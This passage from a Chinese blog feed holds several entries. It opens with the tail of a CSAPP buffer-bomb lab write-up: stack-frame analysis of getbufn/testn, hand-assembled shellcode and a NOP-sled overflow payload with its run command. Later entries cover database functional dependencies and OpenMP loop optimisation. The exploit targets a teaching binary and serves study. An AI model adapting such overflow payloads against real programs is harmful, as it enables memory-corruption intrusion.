&lt;testn+0x38&gt;</span><br><span class="line"> 8048cf0:c7 44 24 04 60 a4 04 movl   $0x804a460,0x4(%esp)</span><br><span class="line"> 8048cf7:08 </span><br><span class="line"> 8048cf8:c7 04 24 01 00 00 00 movl   $0x1,(%esp)</span><br><span class="line"> 8048cff:e8 8c fc ff ff       call   8048990 &lt;__printf_chk@plt&gt;</span><br><span class="line"> 8048d04:eb 46                jmp    8048d4c &lt;testn+0x7e&gt;</span><br><span class="line"> 8048d06:3b 1d 04 d1 04 08    cmp    0x804d104,%ebx</span><br><span class="line"> 8048d0c:75 26                jne    8048d34 &lt;testn+0x66&gt;</span><br><span class="line"> 8048d0e:89 5c 24 08          mov    %ebx,0x8(%esp)</span><br><span class="line"> 8048d12:c7 44 24 04 8c a4 04 movl   $0x804a48c,0x4(%esp)</span><br><span class="line"> 8048d19:08 </span><br><span class="line"> 8048d1a:c7 04 24 01 00 00 00 movl   $0x1,(%esp)</span><br><span class="line"> 8048d21:e8 6a fc ff ff       call   8048990 &lt;__printf_chk@plt&gt;</span><br><span class="line"> 8048d26:c7 04 24 04 00 00 00 movl   $0x4,(%esp)</span><br><span class="line"> 8048d2d:e8 4e 05 00 00       call   8049280 &lt;validate&gt;</span><br><span class="line"> 8048d32:eb 18                jmp    8048d4c &lt;testn+0x7e&gt;</span><br><span class="line"> 8048d34:89 5c 24 08          mov    %ebx,0x8(%esp)</span><br><span class="line"> 8048d38:c7 44 24 04 a6 a2 04 movl   $0x804a2a6,0x4(%esp)</span><br><span class="line"> 8048d3f:08 </span><br><span class="line"> 8048d40:c7 04 24 01 00 00 00 movl   $0x1,(%esp)</span><br><span class="line"> 8048d47:e8 44 fc ff ff       call   8048990 &lt;__printf_chk@plt&gt;</span><br><span class="line"> 8048d4c:83 c4 24             add    $0x24,%esp</span><br><span class="line"> 8048d4f:5b                   pop    %ebx</span><br><span class="line"> 8048d50:5d                   pop    %ebp</span><br><span class="line"> 8048d51:c3                   ret    </span><br></pre></td></tr></table></figure><p>getbufn的栈帧结构如下:</p><img src="../images/bufferbomb/image-20240516220211069.png" alt="image-20240516220211069" style="zoom:67%;"><p>那么buf区就要填满<br>$$<br>0x208 + 4(返回地址)+4(填入参数)&#x3D;528个字节<br>$$<br>而对于testn函数，由于其栈帧每次都不同，那么ebp的位置也不同，但是根据下面的汇编代码:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">8048cce:55                   push   %ebp</span><br><span class="line">8048ccf:89 e5                mov    %esp,%ebp</span><br><span class="line">8048cd1:53                   push   %ebx</span><br><span class="line">8048cd2:83 ec 24             sub    $0x24,%esp</span><br><span class="line">8048cd5:e8 3e ff ff ff       call   8048c18 &lt;uniqueval&gt;</span><br><span class="line">8048cda:89 45 f4             mov    %eax,-0xc(%ebp)</span><br><span class="line">8048cdd:e8 62 05 00 00       call   8049244 &lt;getbufn&gt;</span><br><span class="line">8048ce2:89 c3                mov    %eax,%ebx</span><br></pre></td></tr></table></figure><p>其开辟的栈帧结构如图:<br><img src="/../images/bufferbomb/image-20240516221552530.png" alt="image-20240516221552530"></p><p>那么就可以得到:<code>ebp=esp+4+0x24=esp+0x28</code></p><p>当getbufn函数返回后，需要返回到testn中调用getbufn函数的下一条指令地址:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">8048cdd:e8 62 05 00 00       call   8049244 &lt;getbufn&gt;</span><br><span class="line">8048ce2:89 c3                mov    %eax,%ebx</span><br></pre></td></tr></table></figure><p>也就是把<code>0x8048ce2</code>压栈，并且将cookie赋给eax，就得到了如下的攻击程序:</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov $0x7fb8d860,%eax   //将cookie赋给eax</span><br><span class="line">lea 0x28(%esp),%ebp //ebp的值为esp+0x28</span><br><span class="line">push $0x8048ce2 //压栈</span><br><span class="line">ret </span><br></pre></td></tr></table></figure><p>将其转换为机器码:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">00000000 &lt;.text&gt;:</span><br><span class="line">   0:b8 60 d8 b8 7f       mov    $0x7fb8d860,%eax</span><br><span class="line">   5:8d 6c 24 28          lea    0x28(%esp),%ebp</span><br><span class="line">   9:68 e2 8c 04 08       push   $0x8048ce2</span><br><span class="line">   e:c3                   ret</span><br></pre></td></tr></table></figure><p>就得到了攻击程序的文本:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">b8 60 d8 b8 7f       </span><br><span class="line">8d 6c 24 28          </span><br><span class="line">68 e2 8c 04 08       </span><br><span class="line">c3       </span><br></pre></td></tr></table></figure><p>由于程序是随机的，不知道何时执行程序，那么就需要nop来进行滑动的操作，等待进行getbufn的操作，因此buf区填充的值应该为nop的操作码也就是<code>0x90</code></p><p>同时需要知道第一个执行的buf首地址，那么就进行gdb调试:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">804924d:8d 85 f8 fd ff ff       lea    -0x208(%ebp),%eax  // 把ebp-0x208的地址加载到eax里，这将作为Gets函数的参数</span><br><span class="line">8049253:89 04 24                mov    %eax,(%esp)        // 把eax的值存入栈顶，这将作为Gets函数的参数</span><br><span class="line">8049256:e8 d7 f9 ff ff          call   8048c32 &lt;Gets&gt;     // 调用Gets函数，它将读取输入并填充到函数栈帧的指定位置</span><br><span class="line">804925b:b8 01 00 00 00          mov    $0x1,%eax    </span><br></pre></td></tr></table></figure><p>eax中存放了buf的首地址，使用<code>b *8049253</code>来设置断点，然后来查看eax寄存器中的值:</p><p><img src="/../images/bufferbomb/image-20240516224349905.png" alt="image-20240516224349905"></p><p>分别是:</p><blockquote><p>0x55682d28</p><p>0x55682d78</p><p>0x55682d68</p><p>0x55682d38</p><p>0x55682d48</p></blockquote><p>取最高的地址<code>0x55682d78</code>作为返回地址,这样子就能通过nop指令来不断向下滑动来执行攻击代码。</p><p>攻击代码占用15个字节，最后需要填充4个字节的地址，那么就需要在前面填充<code>528-15-4=509</code>个字节的0x90</p><p>最终得到了如下的文本:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">...</span><br><span class="line">//500</span><br><span class="line">90 90 90 90 90 90 90 90 90 </span><br><span class="line">b8 60 d8 b8 7f       </span><br><span class="line">8d 6c 24 28          </span><br><span class="line">68 e2 8c 04 08       </span><br><span class="line">c3     </span><br><span class="line">78 2d 68 55</span><br></pre></td></tr></table></figure><p>然后通过运行<code>cat level4_handler.txt |./hex2raw -n|./bufbomb -n -u 202226010418</code>来验证</p><p><img src="/../images/bufferbomb/image-20240516231607866.png" alt="image-20240516231607866"></p><h2 id="五、实验总结"><a href="#五、实验总结" class="headerlink" title="五、实验总结"></a>五、实验总结</h2><ol><li><p><strong>深入理解缓冲区溢出</strong>：通过亲手实践，我对缓冲区溢出攻击的具体细节和背后的原理有了更加深入的理解。这种攻击不仅仅是理论上的概念，而是可以具体执行和观察的。</p></li><li><p><strong>安全意识的提升</strong>：完成这个实验强化了我在编码时需要持续保持高度警觉的重要性。现在我更加意识到，在设计和实现软件系统时，考虑安全性是非常关键的。</p></li><li><p><strong>工具和技术的掌握</strong>：通过这个实验，我学会了使用一些重要的工具和技术，比如gdb调试器，以及一些用于分析程序执行和内存布局的技巧。这些技能不仅对于安全研究来说是宝贵的，对于一般的软件开发和维护也同样重要。</p></li><li><p><strong>攻防平衡的认识</strong>：学习如何执行缓冲区溢出攻击让我深刻认识到，不仅要学会如何保护系统不受攻击，还需理解攻击者的思维。这样的双向认识有助于更好地设计防御策略。</p></li><li><p><strong>细节的重要性</strong>：实验教会了我对编程中的细节要给予足够的重视。一行代码中的一个小错误或遗漏都可能导致安全漏洞。</p></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;一、实验目的：&quot;&gt;&lt;a href=&quot;#一、实验目的：&quot; class=&quot;headerlink&quot; title=&quot;一、实验目的：&quot;&gt;&lt;/a&gt;一、实验目的：&lt;/h2&gt;&lt;p&gt;通过缓冲区溢出攻击，使学生进一步理解IA-32函数调用规则和栈帧结构。&lt;/p&gt;
&lt;h2 id=&quot;二、</summary>
      
    
    
    
    <category term="计算机系统" scheme="https://ycx6666.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"/>
    
    
    <category term="实验" scheme="https://ycx6666.github.io/tags/%E5%AE%9E%E9%AA%8C/"/>
    
  </entry>
  
  <entry>
    <title></title>
    <link href="https://ycx6666.github.io/2024/05/%E6%95%B0%E6%8D%AE%E5%BA%93%E8%AE%BE%E8%AE%A1/"/>
    <id>https://ycx6666.github.io/2024/05/%E6%95%B0%E6%8D%AE%E5%BA%93%E8%AE%BE%E8%AE%A1/</id>
    <published>2024-05-18T07:40:43.978Z</published>
    <updated>2024-05-18T07:40:43.980Z</updated>
    
    <content type="html"><![CDATA[<p>函数依赖（Functional Dependency）是数据库理论中的重要概念，用于描述关系数据库表中属性之间的约束关系。如果一个表中的某一个属性值能够唯一确定另一个属性的值，那么我们可以说后者依赖于前者。这种依赖关系帮助我们判断数据在逻辑上的相关性。</p><p>为了判定一个表中属性之间的函数依赖关系，您可以遵循以下步骤：</p><ol><li>确定候选键：首先识别表中的所有候选键，候选键是可以唯一识别表中每一行的最小字段集。</li><li>定义依赖：查看表中其他非候选键属性是否可以被候选键的子集或整体唯一确定。其形式为 X → Y，这意味着如果我们知道X的值，则可以确定Y的值。</li><li>观察数据：根据表中的实际数据，观察是否存在两行，它们在X属性上具有相同的值，且在Y属性上也具有相同的值。</li><li>推理规则：利用已知的函数依赖和推理规则（例如传递规则、增广规则和分解规则）来识别其他可能的函数依赖。</li><li>验证依赖：对于推断出的函数依赖关系，您可以通过添加数据或假设新的数据场景来验证其是否真实存在。</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;函数依赖（Functional Dependency）是数据库理论中的重要概念，用于描述关系数据库表中属性之间的约束关系。如果一个表中的某一个属性值能够唯一确定另一个属性的值，那么我们可以说后者依赖于前者。这种依赖关系帮助我们判断数据在逻辑上的相关性。&lt;/p&gt;
&lt;p&gt;为了判</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="https://ycx6666.github.io/2024/05/%E9%87%8D%E6%96%B0%E7%BB%84%E5%90%88%E5%8F%98%E6%8D%A2/"/>
    <id>https://ycx6666.github.io/2024/05/%E9%87%8D%E6%96%B0%E7%BB%84%E5%90%88%E5%8F%98%E6%8D%A2/</id>
    <published>2024-05-18T07:40:28.233Z</published>
    <updated>2024-05-18T07:40:28.236Z</updated>
    
    <content type="html"><![CDATA[<h2 id="OpenMP"><a href="#OpenMP" class="headerlink" title="OpenMP"></a>OpenMP</h2><h3 id="OpenMP-的工作原理"><a href="#OpenMP-的工作原理" class="headerlink" title="OpenMP 的工作原理"></a>OpenMP 的工作原理</h3><ol><li><strong>基于线程的并行模型</strong>：<ul><li>OpenMP 采用线程并行模型来执行任务。程序启动时开始执行一个主线程，当遇到并行区域时，主线程会创建一组线程来并行执行区域内的任务。完成后，这些线程同步合并回主线程，并继续顺序执行。</li></ul></li><li><strong>编译器指令（Pragmas）</strong>：<ul><li>OpenMP 通过预处理器指令（比如<code>#pragma</code>）向编译器传达并行执行的信息。这些指令指明随后的代码块（通常是循环）应该并行执行。开发者可以使用不同的指令来控制并行性的粒度和类型，如并行区域的创建、循环迭代的分配、同步机制等。</li></ul></li><li><strong>运行时环境</strong>：<ul><li>OpenMP 提供了一系列的运行时环境变量，允许在程序运行时对并行执行进行细粒度控制，例如设置线程数、调节负载平衡策略等。</li></ul></li><li><strong>内存模型</strong>：<ul><li>OpenMP 使用共享内存模型，即所有线程可以访问相同的内存空间。这简化了数据交换和通信，但也要求开发者小心处理数据依赖和竞争条件等问题。OpenMP 提供了机制来保护数据，例如临界区（critical sections）和原子操作（atomic operations）。</li></ul></li><li><strong>负载均衡</strong>：<ul><li>OpenMP 支持动态地将任务负载分配给线程，确保所有核心尽可能均匀忙碌，最大化资源利用。</li></ul></li></ol><h2 id="源码"><a href="#源码" class="headerlink" title="源码:"></a>源码:</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ll long long</span></span><br><span class="line"></span><br><span class="line">ll <span class="title function_">sum_array_optimized</span><span class="params">(<span class="type">int</span> *x, <span class="type">int</span> *y, <span class="type">int</span> length, <span class="type">int</span> c)</span> &#123;</span><br><span class="line">    ll sum = <span class="number">0</span>;</span><br><span class="line">    ll i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (; i &lt; length; i++) </span><br><span class="line">        sum += x[i] * y[i]+c;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> sum; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  ll length = <span class="number">99999999</span>; <span class="comment">// 数组长度</span></span><br><span class="line">  <span class="type">int</span> *x = (<span class="type">int</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>)*length);</span><br><span class="line">  <span class="type">int</span> *y = (<span class="type">int</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>)*length);</span><br><span class="line">  ll i = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (; i &lt; length;i++)&#123;</span><br><span class="line">    x[i] = <span class="number">10</span>, y[i] = <span class="number">10</span>;</span><br><span class="line">  &#125;</span><br><span class="line">    <span class="type">int</span> c = <span class="number">-4</span>; <span class="comment">// 示例常数c</span></span><br><span class="line"></span><br><span class="line">  <span class="type">clock_t</span> start, end;</span><br><span class="line">  <span class="type">double</span> cpu_time_used;</span><br><span class="line"></span><br><span class="line">  start = clock();</span><br><span class="line">  ll result = sum_array_optimized(x, y, length, c);</span><br><span class="line">  end = clock();</span><br><span class="line"></span><br><span class="line">  cpu_time_used = ((<span class="type">double</span>)(end - start)) / CLOCKS_PER_SEC;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;运算结果: %lld\n&quot;</span>, result);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;运算花费时长: %f 秒\n&quot;</span>, cpu_time_used);</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">free</span>(x); <span class="comment">// 释放分配的内存</span></span><br><span class="line">  <span class="built_in">free</span>(y);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果(c为整数int型):</p><p><img src="/../images/%E9%87%8D%E6%96%B0%E7%BB%84%E5%90%88%E5%8F%98%E6%8D%A2/image-20240516185334209-17158568152943.png" alt="image-20240516185334209"></p><p>运行结果(c为浮点double型):</p><p><img src="/../images/%E9%87%8D%E6%96%B0%E7%BB%84%E5%90%88%E5%8F%98%E6%8D%A2/image-20240516190654403.png" alt="image-20240516190654403"></p><h3 id="优化"><a href="#优化" class="headerlink" title="优化:"></a>优化:</h3><p>考虑以下的优化方法：</p><ol><li>分支预测优化: 尽量减少或重组代码中的条件语句，避免处理器分支预测失败导致的性能损失。</li><li>并行计算: 如果使用的编译器和硬件支持，可以利用并行计算来提升性能，如 OpenMP 用于在多核心处理器上自动分配计算。</li></ol><p>基于这两种思路来修改代码。就得到了如下进行优化后的代码:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ll long long</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用CSAPP中的方法优化的函数</span></span><br><span class="line">ll <span class="title function_">sum_array_optimized</span><span class="params">(<span class="type">int</span> *x, <span class="type">int</span> *y, <span class="type">int</span> length, <span class="type">int</span> c)</span> &#123;</span><br><span class="line">    ll sum = <span class="number">0</span>;</span><br><span class="line">    ll i = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> limit = length - <span class="number">1</span>; <span class="comment">// 提前计算循环上界，减少每次循环的计算量</span></span><br><span class="line">    <span class="type">int</span> temp_sum = <span class="number">0</span>; <span class="comment">// 使用局部变量减少内存访问</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; limit; i += <span class="number">2</span>) &#123; <span class="comment">// 双倍增加步长以减少循环次数</span></span><br><span class="line">        temp_sum += x[i] * y[i] + c;</span><br><span class="line">        temp_sum += x[i+<span class="number">1</span>] * y[i+<span class="number">1</span>] + c; <span class="comment">// 展开循环内的计算以增加指令级并行性</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 处理尾部可能未对齐的元素</span></span><br><span class="line">    <span class="keyword">for</span> (; i &lt; length; ++i) &#123;</span><br><span class="line">        temp_sum += x[i] * y[i] + c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    sum = temp_sum;</span><br><span class="line">    <span class="keyword">return</span> sum; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    ll length = <span class="number">99999999</span>; <span class="comment">// 数组长度</span></span><br><span class="line">    <span class="type">int</span> *x = (<span class="type">int</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>) * length);</span><br><span class="line">    <span class="type">int</span> *y = (<span class="type">int</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>) * length);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 确保分配的内存是对齐的，提高存取效率</span></span><br><span class="line">    <span class="keyword">if</span> (x == <span class="literal">NULL</span> || y == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;Memory allocation failed&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 初始化数组元素，以便测试</span></span><br><span class="line">    ll i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (; i &lt; length; i++)&#123;</span><br><span class="line">        x[i] = <span class="number">10</span>;</span><br><span class="line">        y[i] = <span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> c = <span class="number">-4</span>; <span class="comment">// 示例常数c</span></span><br><span class="line"></span><br><span class="line">    <span class="type">clock_t</span> start, end;</span><br><span class="line">    <span class="type">double</span> cpu_time_used;</span><br><span class="line"></span><br><span class="line">    start = clock(); <span class="comment">// 记录起始时间</span></span><br><span class="line">    ll result = sum_array_optimized(x, y, length, c);</span><br><span class="line">    end = clock(); <span class="comment">// 记录结束时间</span></span><br><span class="line"></span><br><span class="line">    cpu_time_used = ((<span class="type">double</span>)(end - start)) / CLOCKS_PER_SEC;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;运算结果: %lld\n&quot;</span>, result);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;运算花费时长: %f 秒\n&quot;</span>, cpu_time_used);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(x); <span class="comment">// 释放分配的内存</span></span><br><span class="line">    <span class="built_in">free</span>(y);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>经过运行，其运行时间为:</p><p>c为整数int型:</p><p><img src="/../images/%E9%87%8D%E6%96%B0%E7%BB%84%E5%90%88%E5%8F%98%E6%8D%A2/image-20240516185423078-17158568643604.png" alt="image-20240516185423078"></p><p>c为浮点double型</p><p><img src="/../images/%E9%87%8D%E6%96%B0%E7%BB%84%E5%90%88%E5%8F%98%E6%8D%A2/image-20240516190714261.png" alt="image-20240516190714261"></p><p>可以看到运行速度大幅提升.</p><p>但是当c为浮点型时，由于OpenMP是多核心并行执行最后结果相加，最后得到的结果会有所不同</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;OpenMP&quot;&gt;&lt;a href=&quot;#OpenMP&quot; class=&quot;headerlink&quot; title=&quot;OpenMP&quot;&gt;&lt;/a&gt;OpenMP&lt;/h2&gt;&lt;h3 id=&quot;OpenMP-的工作原理&quot;&gt;&lt;a href=&quot;#OpenMP-的工作原理&quot; class=&quot;head</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>openMP</title>
    <link href="https://ycx6666.github.io/2024/05/OpenMP/"/>
    <id>https://ycx6666.github.io/2024/05/OpenMP/</id>
    <published>2024-05-17T13:44:57.000Z</published>
    <updated>2024-05-18T07:42:17.073Z</updated>
    
    <content type="html"><![CDATA[<h2 id="OpenMP"><a href="#OpenMP" class="headerlink" title="OpenMP"></a>OpenMP</h2><h3 id="OpenMP-的工作原理"><a href="#OpenMP-的工作原理" class="headerlink" title="OpenMP 的工作原理"></a>OpenMP 的工作原理</h3><ol><li><strong>基于线程的并行模型</strong>：<ul><li>OpenMP 采用线程并行模型来执行任务。程序启动时开始执行一个主线程，当遇到并行区域时，主线程会创建一组线程来并行执行区域内的任务。完成后，这些线程同步合并回主线程，并继续顺序执行。</li></ul></li><li><strong>编译器指令（Pragmas）</strong>：<ul><li>OpenMP 通过预处理器指令（比如<code>#pragma</code>）向编译器传达并行执行的信息。这些指令指明随后的代码块（通常是循环）应该并行执行。开发者可以使用不同的指令来控制并行性的粒度和类型，如并行区域的创建、循环迭代的分配、同步机制等。</li></ul></li><li><strong>运行时环境</strong>：<ul><li>OpenMP 提供了一系列的运行时环境变量，允许在程序运行时对并行执行进行细粒度控制，例如设置线程数、调节负载平衡策略等。</li></ul></li><li><strong>内存模型</strong>：<ul><li>OpenMP 使用共享内存模型，即所有线程可以访问相同的内存空间。这简化了数据交换和通信，但也要求开发者小心处理数据依赖和竞争条件等问题。OpenMP 提供了机制来保护数据，例如临界区（critical sections）和原子操作（atomic operations）。</li></ul></li><li><strong>负载均衡</strong>：<ul><li>OpenMP 支持动态地将任务负载分配给线程，确保所有核心尽可能均匀忙碌，最大化资源利用。</li></ul></li></ol><h2 id="源码"><a href="#源码" class="headerlink" title="源码:"></a>源码:</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ll long long</span></span><br><span class="line"></span><br><span class="line">ll <span class="title function_">sum_array_optimized</span><span class="params">(<span class="type">int</span> *x, <span class="type">int</span> *y, <span class="type">int</span> length, <span class="type">int</span> c)</span> &#123;</span><br><span class="line">    ll sum = <span class="number">0</span>;</span><br><span class="line">    ll i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (; i &lt; length; i++) </span><br><span class="line">        sum += x[i] * y[i]+c;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> sum; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  ll length = <span class="number">99999999</span>; <span class="comment">// 数组长度</span></span><br><span class="line">  <span class="type">int</span> *x = (<span class="type">int</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>)*length);</span><br><span class="line">  <span class="type">int</span> *y = (<span class="type">int</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>)*length);</span><br><span class="line">  ll i = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (; i &lt; length;i++)&#123;</span><br><span class="line">    x[i] = <span class="number">10</span>, y[i] = <span class="number">10</span>;</span><br><span class="line">  &#125;</span><br><span class="line">    <span class="type">int</span> c = <span class="number">-4</span>; <span class="comment">// 示例常数c</span></span><br><span class="line"></span><br><span class="line">  <span class="type">clock_t</span> start, end;</span><br><span class="line">  <span class="type">double</span> cpu_time_used;</span><br><span class="line"></span><br><span class="line">  start = clock();</span><br><span class="line">  ll result = sum_array_optimized(x, y, length, c);</span><br><span class="line">  end = clock();</span><br><span class="line"></span><br><span class="line">  cpu_time_used = ((<span class="type">double</span>)(end - start)) / CLOCKS_PER_SEC;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;运算结果: %lld\n&quot;</span>, result);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;运算花费时长: %f 秒\n&quot;</span>, cpu_time_used);</span><br><span class="line">  </span><br><span 